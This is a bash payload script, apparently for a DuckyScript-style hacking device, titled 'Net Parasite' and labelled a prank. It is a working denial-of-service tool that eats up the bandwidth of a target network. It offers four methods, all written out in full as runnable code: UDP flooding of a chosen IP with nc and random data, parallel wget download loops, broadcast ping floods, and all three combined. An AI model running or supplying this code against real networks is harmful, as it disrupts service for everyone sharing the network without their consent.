#!/bin/bash
# Title: Net Parasite
# Author: bad-antics
# Description: Bandwidth hog to slow down target network
# Category: nullsec/pranks

PROMPT "NET PARASITE

Consume bandwidth on
target network to slow
all other users.

Multiple methods:
- UDP flood
- Download loop
- Multicast spam

Press OK to continue."

INTERFACE="wlan0"

PROMPT "METHOD:

1. UDP Flood (fast)
2. Download Loop
3. Broadcast Storm
4. Combined Chaos

Enter method next."

METHOD=$(NUMBER_PICKER "Method (1-4):" 1)
DURATION=$(NUMBER_PICKER "Duration (sec):" 30)

resp=$(CONFIRMATION_DIALOG "START PARASITE?

This will consume
massive bandwidth.

Network will slow to
a crawl.

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Net Parasite active..."
SPINNER_START "Consuming bandwidth..."

case $METHOD in
    1) # UDP Flood
        TARGET=$(TEXT_PICKER "Target IP:" "192.168.1.1")
        
        # Generate traffic
        for i in $(seq 1 10); do
            cat /dev/urandom | nc -u -w $DURATION $TARGET $((5000 + i)) &
        done
        
        sleep $DURATION
        killall nc 2>/dev/null
        ;;
        
    2) # Download loop
        PROMPT "DOWNLOAD LOOP

Will continuously
download large files.

Requires internet.

Press OK to continue."
        
        for i in $(seq 1 5); do
            timeout $DURATION wget -q -O /dev/null "http://speedtest.tele2.net/100MB.zip" &
        done
        
        sleep $DURATION
        killall wget 2>/dev/null
        ;;
        
    3) # Broadcast storm
        GATEWAY=$(ip route | grep default | awk '{print $3}')
        BROADCAST=$(ip addr show $INTERFACE | grep "brd" | awk '{print $4}' | head -1)
        BROADCAST=${BROADCAST:-255.255.255.255}
        
        for i in $(seq 1 20); do
            ping -b -f -c 10000 $BROADCAST &
        done
        
        sleep $DURATION
        killall ping 2>/dev/null
        ;;
        
    4) # Combined
        TARGET=$(TEXT_PICKER "Target IP:" "192.168.1.1")
        BROADCAST=$(ip addr show $INTERFACE | grep "brd" | awk '{print $4}' | head -1)
        
        # UDP flood
        cat /dev/urandom | nc -u -w $DURATION $TARGET 5000 &
        # Broadcast
        ping -b -f -c 10000 ${BROADCAST:-255.255.255.255} &
        # Download
        timeout $DURATION wget -q -O /dev/null "http://speedtest.tele2.net/10MB.zip" &
        
        sleep $DURATION
        killall nc ping wget 2>/dev/null
        ;;
esac

SPINNER_STOP

PROMPT "PARASITE COMPLETE

Bandwidth consumed
for ${DURATION}s.

Network should be
back to normal now.

Press OK to exit."
